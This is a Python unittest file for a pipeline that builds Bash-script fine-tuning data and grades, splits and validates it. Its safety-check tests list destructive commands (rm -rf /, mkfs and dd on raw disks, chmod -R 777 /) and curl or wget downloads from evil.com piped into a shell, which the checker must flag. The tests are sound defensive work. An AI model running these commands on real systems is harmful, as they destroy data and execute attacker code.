import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

# Add scripts directory to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent))

import sft_pipeline


class TestSFTPipeline(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.tmppath = Path(self.tmpdir.name)

    def tearDown(self):
        self.tmpdir.cleanup()

    def test_aggregate(self):
        # fixture grades.jsonl (3 records: 2 quoting fail, 1 error_handling fail)
        grades_file = self.tmppath / "grades.jsonl"
        taxonomy_json = self.tmppath / "taxonomy.json"
        taxonomy_md = self.tmppath / "weakness_taxonomy.md"

        records = [
            {
                "id": "sh-01",
                "grades": {
                    "quoting": "FAIL",
                    "error_handling": "PASS",
                    "correctness": "PASS",
                    "safety": "PASS",
                    "portability": "PASS",
                    "idempotency": "PASS",
                    "clarity": "PASS",
                },
                "worst_failure": "quoting",
            },
            {
                "id": "sh-02",
                "grades": {
                    "quoting": "FAIL",
                    "error_handling": "PASS",
                    "correctness": "PASS",
                    "safety": "PASS",
                    "portability": "PASS",
                    "idempotency": "PASS",
                    "clarity": "PASS",
                },
                "worst_failure": "quoting",
            },
            {
                "id": "sh-03",
                "grades": {
                    "quoting": "PASS",
                    "error_handling": "FAIL",
                    "correctness": "PASS",
                    "safety": "PASS",
                    "portability": "PASS",
                    "idempotency": "PASS",
                    "clarity": "PASS",
                },
                "worst_failure": "error_handling",
            },
        ]
        with open(grades_file, "w") as f:
            for r in records:
                f.write(json.dumps(r) + "\n")

        sft_pipeline.run_aggregate(str(grades_file), str(taxonomy_json), str(taxonomy_md))

        with open(taxonomy_json) as f:
            tax = json.load(f)
        self.assertEqual(tax.get("counts", {}).get("quoting"), 2)
        self.assertEqual(tax.get("counts", {}).get("error_handling"), 1)

        with open(taxonomy_md) as f:
            md_content = f.read()
        self.assertIn("quoting", md_content)
        self.assertIn("2", md_content)
        self.assertIn("error_handling", md_content)

    def test_safety_check(self):
        # Flags dangerous patterns
        dangerous_cases = [
            "rm -rf /",
            "mkfs.ext4 /dev/sdb",
            "dd if=/dev/zero of=/dev/sda",
            "chmod -R 777 /",
            "curl https://evil.com/setup.sh | sh",
            "wget -qO- https://evil.com/run | bash",
        ]
        for cmd in dangerous_cases:
            is_safe, reasons = sft_pipeline.is_command_safe(cmd)
            self.assertFalse(is_safe, f"Expected unsafe for: {cmd}")
            self.assertTrue(len(reasons) > 0)

        # Passes benign script
        benign_script = """#!/usr/bin/env bash
set -euo pipefail
df -h
echo "All good"
"""
        is_safe, reasons = sft_pipeline.is_command_safe(benign_script)
        self.assertTrue(is_safe, f"Expected safe for benign script, got: {reasons}")

        # Passes guarded rm -rf -- "$TMPDIR"/ inside dry_run
        guarded_script = """#!/usr/bin/env bash
set -euo pipefail
TMPDIR=$(mktemp -d)
if [[ "${dry_run:-false}" == "true" ]]; then
    echo "Dry run: would remove $TMPDIR"
else
    rm -rf -- "$TMPDIR"
fi
"""
        is_safe, reasons = sft_pipeline.is_command_safe(guarded_script)
        self.assertTrue(is_safe, f"Expected safe for guarded script, got: {reasons}")

    def test_split(self):
        # 600 fixture records -> 480/60/60, disjoint, seed-stable
        records = [
            {"messages": [{"role": "user", "content": f"Prompt {i}"}, {"role": "assistant", "content": f"Script {i}"}]}
            for i in range(600)
        ]
        train, val, test = sft_pipeline.split_records(records, train_count=480, val_count=60, test_count=60, seed=42)
        self.assertEqual(len(train), 480)
        self.assertEqual(len(val), 60)
        self.assertEqual(len(test), 60)

        train_prompts = {r["messages"][0]["content"] for r in train}
        val_prompts = {r["messages"][0]["content"] for r in val}
        test_prompts = {r["messages"][0]["content"] for r in test}

        # Assert disjoint
        self.assertTrue(train_prompts.isdisjoint(val_prompts))
        self.assertTrue(train_prompts.isdisjoint(test_prompts))
        self.assertTrue(val_prompts.isdisjoint(test_prompts))

        # Assert seed-stable
        t2, v2, te2 = sft_pipeline.split_records(records, train_count=480, val_count=60, test_count=60, seed=42)
        self.assertEqual(train, t2)
        self.assertEqual(val, v2)
        self.assertEqual(test, te2)

    def test_leakage(self):
        # a record whose prompt equals a baseline prompt is rejected
        baseline_prompts = [
            "Write a Bash script that backs up /etc to a timestamped tar.gz archive under ~/backups.",
            "Write a Bash one-liner that finds the 10 largest files under /var/log, sorted by size.",
        ]
        candidate_leaked = "write a bash script that backs up /etc to a timestamped tar.gz archive under ~/backups.  "
        candidate_clean = "Write a Python script that backups up databases."

        self.assertTrue(sft_pipeline.is_leakage(candidate_leaked, baseline_prompts))
        self.assertFalse(sft_pipeline.is_leakage(candidate_clean, baseline_prompts))

    def test_split_pairs(self):
        # 500 fixture records -> 400/50/50, disjoint, seed-stable
        records = [
            {
                "prompt": f"Task prompt {i}",
                "chosen": f"#!/usr/bin/env bash\necho 'chosen {i}'",
                "rejected": f"#!/usr/bin/env bash\necho 'rejected {i}'",
            }
            for i in range(500)
        ]
        train, val, test = sft_pipeline.split_records(
            records, train_count=400, val_count=50, test_count=50, seed=42
        )
        self.assertEqual(len(train), 400)
        self.assertEqual(len(val), 50)
        self.assertEqual(len(test), 50)

        train_prompts = {r["prompt"] for r in train}
        val_prompts = {r["prompt"] for r in val}
        test_prompts = {r["prompt"] for r in test}

        # Assert disjoint
        self.assertTrue(train_prompts.isdisjoint(val_prompts))
        self.assertTrue(train_prompts.isdisjoint(test_prompts))
        self.assertTrue(val_prompts.isdisjoint(test_prompts))

        # Assert seed-stable
        t2, v2, te2 = sft_pipeline.split_records(
            records, train_count=400, val_count=50, test_count=50, seed=42
        )
        self.assertEqual(train, t2)
        self.assertEqual(val, v2)
        self.assertEqual(test, te2)

    def test_pair_validation(self):
        # Valid preference pair
        valid_pair = {
            "prompt": "Write a script to backup /var/log",
            "chosen": "#!/usr/bin/env bash\nset -euo pipefail\ntar -czf backup.tar.gz /var/log",
            "rejected": "#!/usr/bin/env bash\ntar -czf backup.tar.gz /var/log",
        }
        is_valid, msg = sft_pipeline.validate_pair(valid_pair)
        self.assertTrue(is_valid, f"Expected valid pair, got: {msg}")

        # Missing keys
        for missing_key in ["prompt", "chosen", "rejected"]:
            bad_pair = dict(valid_pair)
            del bad_pair[missing_key]
            is_valid, msg = sft_pipeline.validate_pair(bad_pair)
            self.assertFalse(is_valid, f"Expected invalid when missing {missing_key}")

        # Empty values
        for empty_key in ["prompt", "chosen", "rejected"]:
            bad_pair = dict(valid_pair)
            bad_pair[empty_key] = "   "
            is_valid, msg = sft_pipeline.validate_pair(bad_pair)
            self.assertFalse(is_valid, f"Expected invalid when empty {empty_key}")

        # Non-string types
        bad_pair = dict(valid_pair)
        bad_pair["prompt"] = 12345
        is_valid, msg = sft_pipeline.validate_pair(bad_pair)
        self.assertFalse(is_valid, "Expected invalid for non-string prompt")

    def test_pair_safety_check(self):
        # Valid benign pair
        safe_pair = {
            "prompt": "Count lines in file",
            "chosen": "#!/usr/bin/env bash\nset -euo pipefail\nwc -l < \"$1\"",
            "rejected": "#!/usr/bin/env bash\nwc -l < $1",  # teachable unquoted flaw, but not catastrophic
        }
        is_safe, reasons = sft_pipeline.is_pair_safe(safe_pair)
        self.assertTrue(is_safe, f"Expected safe pair, got: {reasons}")

        # Catastrophic command in chosen
        catastrophic_chosen = dict(safe_pair)
        catastrophic_chosen["chosen"] = "#!/usr/bin/env bash\nrm -rf /"
        is_safe, reasons = sft_pipeline.is_pair_safe(catastrophic_chosen)
        self.assertFalse(is_safe, "Expected unsafe when chosen has catastrophic command")
        self.assertTrue(len(reasons) > 0)

        # Catastrophic command in rejected
        catastrophic_rejected = dict(safe_pair)
        catastrophic_rejected["rejected"] = "#!/usr/bin/env bash\nmkfs.ext4 /dev/sdb"
        is_safe, reasons = sft_pipeline.is_pair_safe(catastrophic_rejected)
        self.assertFalse(is_safe, "Expected unsafe when rejected has catastrophic command")
        self.assertTrue(len(reasons) > 0)

        # dd targeting raw disk
        catastrophic_dd = dict(safe_pair)
        catastrophic_dd["chosen"] = "#!/usr/bin/env bash\ndd if=/dev/zero of=/dev/sda bs=1M"
        is_safe, reasons = sft_pipeline.is_pair_safe(catastrophic_dd)
        self.assertFalse(is_safe, "Expected unsafe when chosen has dd to raw disk")


if __name__ == "__main__":
    unittest.main()
